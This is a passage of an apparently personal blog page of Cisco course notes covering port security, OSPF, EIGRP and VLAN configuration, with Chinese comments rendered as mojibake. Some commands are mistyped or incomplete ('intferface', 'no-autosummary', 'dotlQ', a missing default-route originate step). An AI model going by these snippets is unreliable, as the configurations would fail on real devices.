class="hljs-number">15</span><br>transport input ssh<br>login local <br><span class="hljs-keyword">exit</span><br>ip ssh version <span class="hljs-number">2</span><br><span class="hljs-keyword">exit</span><br><br>int f0/<span class="hljs-number">1</span><br>switchport mode access <br>switchport port-security <br>switchport port-security maximum <span class="hljs-number">2</span><br>switchport port-security mac-address sticky <span class="hljs-comment">#å¯ç”¨ç²˜æ€§è·å–ï¼Œä¿æŠ¤ç«¯å£å®‰å…¨ï¼Œä»¥ä¾¿åŠ¨æ€è·å–è®¾å¤‡çš„ MAC åœ°å€å¹¶å°†å…¶æ·»åŠ åˆ°è¿è¡Œé…ç½®</span><br>switchport port-security violation shutdown <span class="hljs-comment">#ä¿æŠ¤æ¥å£ï¼Œä½¿å…¶åœ¨å‡ºç°è¿è§„æ—¶å‘å‡ºé€šçŸ¥ï¼Œç¦ç”¨ç«¯å£</span><br>int f0/<span class="hljs-number">2</span><br>switchport mode access <br>switchport port-security <br>switchport port-security maximum <span class="hljs-number">2</span><br>switchport port-security mac-address sticky <br>switchport port-security violation shutdown <br>interface range fastEthernet0/<span class="hljs-number">3</span> - <span class="hljs-number">24</span> <span class="hljs-comment"># ä»3åˆ°24ç«¯å£å…¨éƒ¨å…³é—­</span><br>shutdown<br>interface range g0/<span class="hljs-number">1</span> - <span class="hljs-number">2</span> <span class="hljs-comment"># </span><br>shutdown<br></code></pre></td></tr></table></figure><h2 id="a5-1-2-12-Determining-the-DR-and-BDR"><a href="#a5-1-2-12-Determining-the-DR-and-BDR" class="headerlink" title="a5.1.2.12 Determining the DR and BDR"></a>a5.1.2.12 Determining the DR and BDR</h2><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">show ip ospf <span class="hljs-keyword">interface</span><br><br>#<span class="hljs-symbol">RA</span>:<br><span class="hljs-symbol">int</span> <span class="hljs-symbol">g0</span>/<span class="hljs-symbol">0</span><br><span class="hljs-symbol">ip</span> <span class="hljs-symbol">ospf</span> <span class="hljs-symbol">priority</span> <span class="hljs-symbol">200</span><br><br>#<span class="hljs-symbol">RB</span>:<br><span class="hljs-symbol">int</span> <span class="hljs-symbol">g0</span>/<span class="hljs-symbol">0</span><br><span class="hljs-symbol">ip</span> <span class="hljs-symbol">ospf</span> <span class="hljs-symbol">priority</span> <span class="hljs-symbol">100</span><br><br>#<span class="hljs-symbol">RC</span>:<br><span class="hljs-symbol">int</span> <span class="hljs-symbol">g0</span>/<span class="hljs-symbol">0</span><br><span class="hljs-symbol">ip</span> <span class="hljs-symbol">ospf</span> <span class="hljs-symbol">priority</span> <span class="hljs-symbol">1</span><br></code></pre></td></tr></table></figure><h2 id="a5-1-3-5-Propagating-a-Default-Route-in-OSPFv2"><a href="#a5-1-3-5-Propagating-a-Default-Route-in-OSPFv2" class="headerlink" title="a5.1.3.5 Propagating a Default Route in OSPFv2"></a>a5.1.3.5 Propagating a Default Route in OSPFv2</h2><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-comment">#R2</span><br><span class="hljs-attribute">ip</span> route <span class="hljs-number">0.0.0.0</span> <span class="hljs-number">0.0.0.0</span> s<span class="hljs-number">0</span>/<span class="hljs-number">1</span>/<span class="hljs-number">0</span><br><span class="hljs-attribute">router</span> ospf <span class="hljs-number">1</span><br><br><span class="hljs-comment">#R1</span><br><span class="hljs-attribute">router</span> ospf <span class="hljs-number">1</span><br><br><span class="hljs-comment">#R3</span><br><span class="hljs-attribute">router</span> ospf <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><h2 id="a5-1-5-7-Configuring-OSPF-Advanced-Features"><a href="#a5-1-5-7-Configuring-OSPF-Advanced-Features" class="headerlink" title="a5.1.5.7 Configuring OSPF Advanced Features"></a>a5.1.5.7 Configuring OSPF Advanced Features</h2><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-comment">#R1</span><br><span class="hljs-attribute">int</span> s<span class="hljs-number">0</span>/<span class="hljs-number">0</span>/<span class="hljs-number">0</span><br><span class="hljs-attribute">ip</span> ospf hello-interval <span class="hljs-number">15</span> #è°ƒæ•´è®¡æ—¶å™¨<br><span class="hljs-attribute">ip</span> ospf dead-interval <span class="hljs-number">60</span><br><br><span class="hljs-attribute">bandwidth</span> <span class="hljs-number">64</span> #è°ƒæ•´å¸¦å®½<br><br><span class="hljs-attribute">router</span> ospf <span class="hljs-number">1</span><br><span class="hljs-attribute">area</span> <span class="hljs-number">0</span> authentication message-digest #OSPFèº«ä»½éªŒè¯<br><span class="hljs-attribute">interface</span> serial <span class="hljs-number">0</span>/<span class="hljs-number">0</span>/<span class="hljs-number">0</span><br><span class="hljs-attribute">ip</span> ospf message-digest-key <span class="hljs-number">1</span> md<span class="hljs-number">5</span> R<span class="hljs-number">1</span>-R<span class="hljs-number">2</span><br><br><span class="hljs-attribute">interface</span> serial <span class="hljs-number">0</span>/<span class="hljs-number">0</span>/<span class="hljs-number">1</span><br><span class="hljs-attribute">ip</span> ospf message-digest-key <span class="hljs-number">1</span> md<span class="hljs-number">5</span> R<span class="hljs-number">1</span>-R<span class="hljs-number">3</span><br><br><span class="hljs-comment">#R2</span><br><span class="hljs-attribute">int</span> s<span class="hljs-number">0</span>/<span class="hljs-number">0</span>/<span class="hljs-number">0</span><br><span class="hljs-attribute">ip</span> ospf hello-interval <span class="hljs-number">15</span><br><span class="hljs-attribute">ip</span> ospf dead-interval <span class="hljs-number">60</span><br><br><span class="hljs-attribute">router</span> ospf <span class="hljs-number">1</span><br><span class="hljs-attribute">area</span> <span class="hljs-number">0</span> authentication message-digest<br><span class="hljs-attribute">interface</span> serial <span class="hljs-number">0</span>/<span class="hljs-number">0</span>/<span class="hljs-number">0</span><br><span class="hljs-attribute">ip</span> ospf message-digest-key <span class="hljs-number">1</span> md<span class="hljs-number">5</span> R<span class="hljs-number">1</span>-R<span class="hljs-number">2</span><br><br><span class="hljs-attribute">interface</span> serial <span class="hljs-number">0</span>/<span class="hljs-number">0</span>/<span class="hljs-number">1</span><br><span class="hljs-attribute">ip</span> ospf message-digest-key <span class="hljs-number">1</span> md<span class="hljs-number">5</span> R<span class="hljs-number">2</span>-R<span class="hljs-number">3</span><br><br><span class="hljs-comment">#R3</span><br><span class="hljs-attribute">router</span> ospf <span class="hljs-number">1</span><br><span class="hljs-attribute">area</span> <span class="hljs-number">0</span> authentication message-digest<br><br><span class="hljs-attribute">interface</span> serial <span class="hljs-number">0</span>/<span class="hljs-number">0</span>/<span class="hljs-number">0</span><br><span class="hljs-attribute">ip</span> ospf message-digest-key <span class="hljs-number">1</span> md<span class="hljs-number">5</span> R<span class="hljs-number">1</span>-R<span class="hljs-number">3</span><br><br><span class="hljs-attribute">interface</span> serial <span class="hljs-number">0</span>/<span class="hljs-number">0</span>/<span class="hljs-number">1</span><br><span class="hljs-attribute">ip</span> ospf message-digest-key <span class="hljs-number">1</span> md<span class="hljs-number">5</span> R<span class="hljs-number">2</span>-R<span class="hljs-number">3</span><br></code></pre></td></tr></table></figure><h2 id="a5-2-1-4-Configuring-Static-NAT-no-yet"><a href="#a5-2-1-4-Configuring-Static-NAT-no-yet" class="headerlink" title="a5.2.1.4 Configuring Static NAT no yet"></a>a5.2.1.4 Configuring Static NAT no yet</h2><h2 id="a5-2-2-3-OSPFv2æ’é”™"><a href="#a5-2-2-3-OSPFv2æ’é”™" class="headerlink" title="a5.2.2.3 OSPFv2æ’é”™"></a>a5.2.2.3 OSPFv2æ’é”™</h2><h2 id="a6-2-3-6-Configuring-Multiarea-OSPFv2"><a href="#a6-2-3-6-Configuring-Multiarea-OSPFv2" class="headerlink" title="a6.2.3.6 Configuring Multiarea OSPFv2"></a>a6.2.3.6 Configuring Multiarea OSPFv2</h2><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-comment">#R1</span><br><span class="hljs-attribute">router</span> ospf <span class="hljs-number">1</span><br><span class="hljs-attribute">router</span>-id <span class="hljs-number">1.1.1.1</span><br><span class="hljs-attribute">network</span> <span class="hljs-number">10.1.1.0</span> <span class="hljs-number">0.0.0.255</span> area <span class="hljs-number">1</span><br><span class="hljs-attribute">network</span> <span class="hljs-number">10.1.2.0</span> <span class="hljs-number">0.0.0.255</span> area <span class="hljs-number">1</span><br><span class="hljs-attribute">network</span> <span class="hljs-number">192.168.10.0</span> <span class="hljs-number">0.0.0.3</span> area <span class="hljs-number">0</span><br><br><span class="hljs-comment">#R2</span><br><span class="hljs-attribute">router</span> ospf <span class="hljs-number">1</span><br><span class="hljs-attribute">network</span> <span class="hljs-number">10.2.1.0</span> <span class="hljs-number">0.0.0.255</span> area <span class="hljs-number">0</span><br><span class="hljs-attribute">network</span> <span class="hljs-number">192.168.10.0</span> <span class="hljs-number">0.0.0.3</span> area <span class="hljs-number">0</span><br><span class="hljs-attribute">network</span> <span class="hljs-number">192.168.10.4</span> <span class="hljs-number">0.0.0.3</span> area <span class="hljs-number">0</span><br><br><span class="hljs-comment">#R2</span><br><span class="hljs-attribute">router</span> ospf <span class="hljs-number">1</span><br><span class="hljs-attribute">network</span> <span class="hljs-number">192.168.1.0</span> <span class="hljs-number">0.0.0.255</span> area <span class="hljs-number">2</span><br><span class="hljs-attribute">network</span> <span class="hljs-number">192.168.2.0</span> <span class="hljs-number">0.0.0.255</span> area <span class="hljs-number">2</span><br><span class="hljs-attribute">network</span> <span class="hljs-number">192.168.10.4</span> <span class="hljs-number">0.0.0.3</span> area <span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><h2 id="a7-2-2-4-Configuring-Basic-EIGRP-with-IPv4"><a href="#a7-2-2-4-Configuring-Basic-EIGRP-with-IPv4" class="headerlink" title="a7.2.2.4 Configuring Basic EIGRP with IPv4"></a>a7.2.2.4 Configuring Basic EIGRP with IPv4</h2><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-comment">#R1ï¼š</span><br><span class="hljs-attribute">router</span> eigrp <span class="hljs-number">1</span><br><span class="hljs-attribute">network</span> <span class="hljs-number">172.16.1.0</span> <span class="hljs-number">0.0.0.255</span><br><span class="hljs-attribute">network</span> <span class="hljs-number">172.16.3.0</span> <span class="hljs-number">0.0.0.3</span><br><span class="hljs-attribute">network</span> <span class="hljs-number">192.168.10.4</span> <span class="hljs-number">0.0.0.3</span><br><span class="hljs-attribute">passive</span>-interface g<span class="hljs-number">0</span>/<span class="hljs-number">0</span><br><span class="hljs-attribute">no</span>-autosummary<br><br><span class="hljs-comment">#R2ï¼š</span><br><span class="hljs-attribute">router</span> eigrp <span class="hljs-number">1</span><br><span class="hljs-attribute">network</span> <span class="hljs-number">172.16.2.0</span> <span class="hljs-number">0.0.0.255</span><br><span class="hljs-attribute">network</span> <span class="hljs-number">172.16.3.0</span> <span class="hljs-number">0.0.0.3</span><br><span class="hljs-attribute">network</span> <span class="hljs-number">192.168.10.8</span> <span class="hljs-number">0.0.0.3</span><br><span class="hljs-attribute">passive</span>-interface g<span class="hljs-number">0</span>/<span class="hljs-number">0</span><br><span class="hljs-attribute">no</span>-autosummary<br><br><span class="hljs-comment">#R3:</span><br><span class="hljs-attribute">router</span> eigrp <span class="hljs-number">1</span><br><span class="hljs-attribute">network</span> <span class="hljs-number">192.168.1.0</span> <span class="hljs-number">0.0.0.255</span><br><span class="hljs-attribute">network</span> <span class="hljs-number">192.168.10.4</span> <span class="hljs-number">0.0.0.3</span><br><span class="hljs-attribute">network</span> <span class="hljs-number">192.168.10.8</span> <span class="hljs-number">0.0.0.3</span><br><span class="hljs-attribute">passive</span>-interface g<span class="hljs-number">0</span>/<span class="hljs-number">0</span><br><span class="hljs-attribute">no</span>-autosummary<br><br></code></pre></td></tr></table></figure><h2 id="4-23"><a href="#4-23" class="headerlink" title="4/23"></a>4/23</h2><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">switchport </span>port-security mac-<span class="hljs-keyword">address </span>&#123;mac_address&#125; <span class="hljs-comment"># é™æ€é…ç½®</span><br></code></pre></td></tr></table></figure><img src="/2020/03/31/cisco%E8%AF%BE%E7%A8%8B%E4%BB%A3%E7%A0%81%E8%AE%B0%E5%BD%95/image-20200423093049790.png" class="" title="image-20200423093049790"><h2 id="4-28"><a href="#4-28" class="headerlink" title="4/28"></a>4/28</h2><img src="/2020/03/31/cisco%E8%AF%BE%E7%A8%8B%E4%BB%A3%E7%A0%81%E8%AE%B0%E5%BD%95/image-20200428100318146.png" class="" title="image-20200428100318146"><img src="/2020/03/31/cisco%E8%AF%BE%E7%A8%8B%E4%BB%A3%E7%A0%81%E8%AE%B0%E5%BD%95/image-20200428100416162.png" class="" title="image-20200428100416162"><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs maxima"><span class="hljs-built_in">show</span> vtp <span class="hljs-built_in">status</span><br></code></pre></td></tr></table></figure><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs actionscript">switchport mode <span class="hljs-keyword">dynamic</span><br></code></pre></td></tr></table></figure><img src="/2020/03/31/cisco%E8%AF%BE%E7%A8%8B%E4%BB%A3%E7%A0%81%E8%AE%B0%E5%BD%95/image-20200428101820419.png" class="" title="image-20200428101820419"><p>islï¼šæ€ç§‘ä¸“æœ‰</p><img src="/2020/03/31/cisco%E8%AF%BE%E7%A8%8B%E4%BB%A3%E7%A0%81%E8%AE%B0%E5%BD%95/image-20200428103111230.png" class="" title="image-20200428103111230"><p>encapsulation dotlQ {num}</p><h2 id="4-30"><a href="#4-30" class="headerlink" title="4/30"></a>4/30</h2><img src="/2020/03/31/cisco%E8%AF%BE%E7%A8%8B%E4%BB%A3%E7%A0%81%E8%AE%B0%E5%BD%95/image-20200430091659535.png" class="" title="image-20200430091659535"><h3 id="å­˜å‚¨è½¬å‘"><a href="#å­˜å‚¨è½¬å‘" class="headerlink" title="å­˜å‚¨è½¬å‘"></a>å­˜å‚¨è½¬å‘</h3><p>å®Œå…¨å­˜ä¸‹æ¥ã€æ ¡éªŒä¹‹åå†è½¬å‘</p><h3 id="ç›´é€š"><a href="#ç›´é€š" class="headerlink" title="ç›´é€š"></a>ç›´é€š</h3><p>çŸ¥é“ç›®çš„macå°±å¼€å§‹è½¬å‘</p><h2 id="5-12"><a href="#5-12" class="headerlink" title="5/12"></a>5/12</h2><h3 id="æŸ¥çœ‹å½“å‰iosæ–‡ä»¶è®¾ç½®"><a href="#æŸ¥çœ‹å½“å‰iosæ–‡ä»¶è®¾ç½®" class="headerlink" title="æŸ¥çœ‹å½“å‰iosæ–‡ä»¶è®¾ç½®"></a>æŸ¥çœ‹å½“å‰iosæ–‡ä»¶è®¾ç½®</h3><figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dart"><span class="hljs-keyword">show</span> boot<br></code></pre></td></tr></table></figure><p><strong>dir</strong> å‘½ä»¤å¯ç”¨äºæŸ¥çœ‹æŒ‡å®šç›®å½•ä¸­çš„æ–‡ä»¶åˆ—è¡¨</p><figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dos"><span class="hljs-built_in">dir</span> flash<br></code></pre></td></tr></table></figure><h3 id="é…ç½®åŒå·¥å’Œé€Ÿç‡"><a href="#é…ç½®åŒå·¥å’Œé€Ÿç‡" class="headerlink" title="é…ç½®åŒå·¥å’Œé€Ÿç‡"></a>é…ç½®åŒå·¥å’Œé€Ÿç‡</h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">intferface</span> f<span class="hljs-number">0</span>/<span class="hljs-number">1</span><br><span class="hljs-attribute">duplex</span> full//è‡ªåŠ¨åå•†åŒå·¥<br><span class="hljs-attribute">speed</span> <span class="hljs-number">100</span><br><span class="hljs-attribute">end</span><br></code></pre></td></tr></table></figure><h3 id="Auto-MDIX"><a href="#Auto-MDIX" class="headerlink" title="Auto-MDIX"></a>Auto-MDIX</h3><blockquote><p>äº¤æ¢æœºåˆ°äº¤æ¢æœºæˆ–äº¤æ¢æœºåˆ°è·¯ç”±å™¨çš„è¿æ¥è¦æ±‚ä½¿ç”¨ä¸åŒçš„ä»¥å¤ªç½‘ç”µç¼†ã€‚åœ¨æ¥å£ä¸Šä½¿ç”¨è‡ªåŠ¨ä»‹è´¨ç›¸å…³æ¥å£äº¤å‰ (auto-MDIX) åŠŸèƒ½å¯ä»¥è§£å†³è¿™ä¸€é—®é¢˜ã€‚å½“å¯ç”¨ auto-MDIX æ—¶ï¼Œæ¥å£ä¼šè‡ªåŠ¨æ£€æµ‹æ‰€éœ€ç”µç¼†è¿æ¥ç±»å‹ï¼ˆç›´é€šæˆ–äº¤å‰ï¼‰å¹¶é…ç½®ç›¸åº”è¿æ¥ã€‚å¦‚æœè¿æ¥åˆ°æ— è‡ªåŠ¨ MDIX åŠŸèƒ½çš„äº¤æ¢æœºï¼Œå¿…é¡»ä½¿ç”¨ç›´é€šç”µç¼†è¿æ¥åˆ°è®¾å¤‡ï¼ˆå¦‚ï¼ŒæœåŠ¡å™¨ã€å·¥ä½œç«™æˆ–è·¯ç”±å™¨ï¼‰ã€‚å¿…é¡»ä½¿ç”¨äº¤å‰çº¿ç¼†è¿æ¥åˆ°å…¶ä»–äº¤æ¢æœºæˆ–ä¸­ç»§å™¨ã€‚</p></blockquote><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-keyword">int</span> f0/<span class="hljs-number">1</span><br>duplex <span class="hljs-keyword">auto</span><br>speed <span class="hljs-keyword">auto</span><span class="hljs-comment">//è‡ªåŠ¨åå•†é€Ÿåº¦</span><br>mdix <span class="hljs-keyword">auto</span> <span class="hljs-comment">//å¯åŠ¨mdix</span><br>end<br></code></pre></td></tr></table></figure><h3 id="6-1-1-2-Vlançš„ä¼˜åŠ¿"><a href="#6-1-1-2-Vlançš„ä¼˜åŠ¿" class="headerlink" title="6.1.1.2 Vlançš„ä¼˜åŠ¿"></a>6.1.1.2 Vlançš„ä¼˜åŠ¿</h3><blockquote><p>VLAN ä¸»è¦æœ‰ä»¥ä¸‹ä¼˜ç‚¹ï¼š</p><ul><li><strong>å®‰å…¨</strong> ï¼ å«æœ‰æ•æ„Ÿæ•°æ®çš„ç”¨æˆ·ç»„å¯ä¸ç½‘ç»œçš„å…¶ä½™éƒ¨åˆ†éš”ç¦»ï¼Œä»è€Œé™ä½æ³„éœ²æœºå¯†ä¿¡æ¯çš„å¯èƒ½æ€§ã€‚å¦‚å›¾æ‰€ç¤ºï¼Œæ•™å¸ˆè®¡ç®—æœºä½äº VLAN 10 ä¸Šï¼Œä¸å­¦ç”Ÿå’Œè®¿å®¢æ•°æ®æµé‡å®Œå…¨ç‹¬ç«‹ã€‚</li></ul><ul><li><strong>æˆæœ¬é™ä½</strong> ï¼ æˆæœ¬é«˜æ˜‚çš„ç½‘ç»œå‡çº§éœ€æ±‚å‡å°‘ï¼Œç°æœ‰å¸¦å®½å’Œä¸Šè¡Œé“¾è·¯çš„åˆ©ç”¨ç‡æ›´é«˜ï¼Œå› æ­¤å¯èŠ‚çº¦æˆæœ¬ã€‚</li></ul><ul><li><strong>æ€§èƒ½æé«˜</strong> ï¼ å°†ç¬¬ 2 å±‚å¹³é¢ç½‘ç»œåˆ’åˆ†ä¸ºå¤šä¸ªé€»è¾‘å·¥ä½œç»„ï¼ˆå¹¿æ’­åŸŸï¼‰å¯ä»¥å‡å°‘ç½‘ç»œä¸Šä¸å¿…è¦çš„æµé‡å¹¶æé«˜æ€§èƒ½ã€‚</li></ul><ul><li><strong>å‡å°å¹¿æ’­åŸŸå¤§å°</strong> - å°†ç½‘ç»œåˆ’åˆ†ä¸ºå¤šä¸ª VLAN å¯å‡å°‘å¹¿æ’­åŸŸä¸­çš„è®¾å¤‡æ•°é‡ã€‚å¦‚å›¾æ‰€ç¤ºï¼Œè¯¥ç½‘ç»œä¸­æœ‰å…­å°è®¡ç®—æœºï¼Œä½†æœ‰ä¸‰ä¸ªå¹¿æ’­åŸŸï¼šFacultyã€Student å’Œ Guestã€‚</li></ul><ul><li><strong>æé«˜ IT å‘˜å·¥æ•ˆç‡</strong> ï¼ VLAN ä¸ºç®¡ç†ç½‘ç»œå¸¦æ¥äº†æ–¹ä¾¿ï¼Œå› ä¸ºæœ‰ç›¸ä¼¼ç½‘ç»œéœ€æ±‚çš„ç”¨æˆ·å°†å…±äº«åŒä¸€ä¸ª VLANã€‚å½“æ‚¨ä¸ºç‰¹å®š VLAN è®¾ç½®æ–°çš„äº¤æ¢æœºæ—¶ï¼Œä¹‹å‰ä¸ºè¯¥ VLAN é…ç½®çš„æ‰€æœ‰ç­–ç•¥å’Œç¨‹åºå‡ä¼šåœ¨åˆ†é…æ–°ç«¯å£ååº”ç”¨åˆ°ç«¯å£ä¸Šã€‚å¦å¤–ï¼Œé€šè¿‡ä¸º VLAN è®¾ç½®ä¸€ä¸ªé€‚å½“çš„åç§°ï¼ŒIT å‘˜å·¥å¾ˆå®¹æ˜“å°±çŸ¥é“è¯¥ VLAN çš„åŠŸèƒ½ã€‚åœ¨å›¾ä¸­ï¼Œä¸ºäº†ä¾¿äºè¯†åˆ«ï¼Œæˆ‘ä»¬å°† VLAN 10 å‘½åä¸ºâ€œFacultyâ€ï¼Œå°† VLAN 20 å‘½åä¸ºâ€œStudentâ€ï¼Œå°† VLAN 30 å‘½åä¸ºâ€œGuestâ€ã€‚</li></ul><ul><li><strong>ç®€åŒ–é¡¹ç›®ç®¡ç†å’Œåº”ç”¨ç®¡ç†</strong> - VLAN å°†ç”¨æˆ·å’Œç½‘ç»œè®¾å¤‡èšåˆåˆ°ä¸€èµ·ï¼Œä»¥æ”¯æŒå•†ä¸šéœ€æ±‚æˆ–åœ°åŸŸä¸Šçš„éœ€æ±‚ã€‚é€šè¿‡åˆ’åˆ†èŒèƒ½ï¼Œå¯ä»¥è®©ç®¡ç†é¡¹ç›®æˆ–ä½¿ç”¨ä¸“ä¸šåº”ç”¨æ›´åŠ è½»æ¾ï¼›æ­¤ç±»åº”ç”¨ç¨‹åºçš„ä¸€ä¸ªä¾‹å­æ˜¯æ•™å¸ˆçš„ç”µå­å­¦ä¹ å¼€å‘å¹³å°ã€‚</li></ul></blockquote><p>æœ‰vlanï¼Œå¹¿æ’­å¸§åªä»å·²é…ç½®ï¼Œå±äºåŒä¸€vlançš„ç«¯å£è½¬å‘å‡ºå»ã€‚</p><h2 id="5-19"><a href="#5-19" class="headerlink" title="5/19"></a>5/19</h2><h3 id="vlançš„ç±»å‹"><a href="#vlançš„ç±»å‹" class="headerlink" title="vlançš„ç±»å‹"></a>vlançš„ç±»å‹</h3><p>åœ¨å›¾ä¸­ï¼Œè¿è¡Œé»˜è®¤é…ç½®çš„äº¤æ¢æœºä¸Šå‘å‡º <strong>show vlan brief</strong> å‘½ä»¤ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼Œæ‰€æœ‰ç«¯å£éƒ½åˆ†é…ç»™ VLAN 1ã€‚</p><img src="/2020/03/31/cisco%E8%AF%BE%E7%A8%8B%E4%BB%A3%E7%A0%81%E8%AE%B0%E5%BD%95/image-20200519105755366.png" class="" title="image-20200519105755366"><p>æ‰€æœ‰ç«¯å£å½“å‰å·²åˆ†é…ç»™é»˜è®¤ VLAN 1ã€‚æ²¡æœ‰æ˜ç¡®æŒ‡å®šæœ¬å¾ VLANï¼Œå…¶ä»– VLAN éƒ½ä¸å¤„äºæ´»åŠ¨çŠ¶æ€ï¼›å› æ­¤ç½‘ç»œçš„æœ¬å¾ VLAN ä¸ç®¡ç† VLAN ç›¸åŒã€‚è¿™å°†å¯¼è‡´å®‰å…¨é£é™©</p><h3 id="6-1-2-1-Vlanä¸­ç»§"><a href="#6-1-2-1-Vlanä¸­ç»§" class="headerlink" title="6.1.2.1 Vlanä¸­ç»§"></a>6.1.2.1 Vlanä¸­ç»§</h3><p>VLAN TRUNK å…è®¸åœ¨äº¤æ¢æœºä¹‹é—´ä¼ æ’­æ‰€æœ‰ VLAN æµé‡ï¼Œè¿™æ ·ä½äºåŒä¸€ VLAN ä½†è¿æ¥åˆ°ä¸åŒäº¤æ¢æœºçš„è®¾å¤‡ä¾¿å¯ä»¥é€šä¿¡ï¼Œä¸éœ€è¦è·¯ç”±å™¨çš„å¹²é¢„ã€‚VLAN TRUNK ä¸å±äºå…·ä½“çš„ VLANï¼Œè€Œæ˜¯ä½œä¸ºå¤šä¸ª VLAN ä¸­äº¤æ¢æœºä¸è·¯ç”±å™¨ä¹‹é—´çš„ç®¡é“ã€‚</p><h3 id="6-1-2-3-æ ‡è®°ä»¥å¤ªç½‘å¸§ä»¥ä¾¿è¯†åˆ«VLAN"><a href="#6-1-2-3-æ ‡è®°ä»¥å¤ªç½‘å¸§ä»¥ä¾¿è¯†åˆ«VLAN" class="headerlink" title="6.1.2.3 æ ‡è®°ä»¥å¤ªç½‘å¸§ä»¥ä¾¿è¯†åˆ«VLAN"></a>6.1.2.3 æ ‡è®°ä»¥å¤ªç½‘å¸§ä»¥ä¾¿è¯†åˆ«VLAN</h3><img src="/2020/03/31/cisco%E8%AF%BE%E7%A8%8B%E4%BB%A3%E7%A0%81%E8%AE%B0%E5%BD%95/image-20200519110222765.png" class="" title="image-20200519110222765"><h3 id="6-2-1-2-åˆ›å»ºvlan"><a href="#6-2-1-2-åˆ›å»ºvlan" class="headerlink" title="6.2.1.2 åˆ›å»ºvlan"></a>6.2.1.2 åˆ›å»ºvlan</h3><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">configure terminal<br>vlan vlan-id<br><span class="hljs-type">name</span> vlan-<span class="hljs-type">name</span><br><span class="hljs-keyword">end</span><br><br><span class="hljs-keyword">show</span> vlan brief<br><span class="hljs-keyword">show</span> vlan<br></code></pre></td></tr></table></figure><h2 id="5-21"><a href="#5-21" class="headerlink" title="5/21"></a>5/21</h2><h3 id="6-2-1-3-ç«¯å£åˆ†é…åˆ°vlan"><a href="#6-2-1-3-ç«¯å£åˆ†é…åˆ°vlan" class="headerlink" title="6.2.1.3 ç«¯å£åˆ†é…åˆ°vlan"></a>6.2.1.3 ç«¯å£åˆ†é…åˆ°vlan</h3><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">configure terminal<br><span class="hljs-keyword">interface</span> <span class="hljs-symbol">interface_id</span><br><span class="hljs-symbol">switchport</span> <span class="hljs-symbol">mode</span> <span class="hljs-symbol">access</span><br><span class="hljs-symbol">switchport</span> <span class="hljs-symbol">access</span> <span class="hljs-symbol">vlan</span> <span 